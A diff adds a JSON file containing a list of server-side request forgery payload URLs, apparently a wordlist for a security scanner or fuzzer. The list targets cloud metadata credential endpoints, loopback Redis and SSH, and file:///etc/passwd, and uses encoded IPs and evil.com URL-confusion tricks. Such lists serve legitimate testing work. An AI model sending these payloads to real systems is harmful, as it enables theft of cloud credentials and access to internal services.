@@ -1,0 +1,27 @@
+{
+  "ssrf": [
+    "http://169.254.169.254/latest/meta-data/",
+    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+    "http://100.100.100.200/latest/meta-data/",
+    "http://127.0.0.1",
+    "http://127.0.0.1%3A22",
+    "http://127.0.0.1%3A6379",
+    "http://localhost",
+    "http://%5B%3A%3A1%5D",
+    "http://2130706433",
+    "http://0x7f000001",
+    "http://127.1",
+    "http://localtest.me",
+    "http://127.0.0.1.nip.io",
+    "http://legit.com%40evil.com",
+    "http://evil.com%23%40legit.com",
+    "http://evil.com/redirect?url=http://127.0.0.1",
+    "file:///etc/passwd",
+    "gopher://127.0.0.1%3A6379/_INFO",
+    "dict://127.0.0.1%3A11211/stat",
+    "ftp://127.0.0.1",
+    "ldap://127.0.0.1",
+    "sftp://127.0.0.1"
+  ]
+}
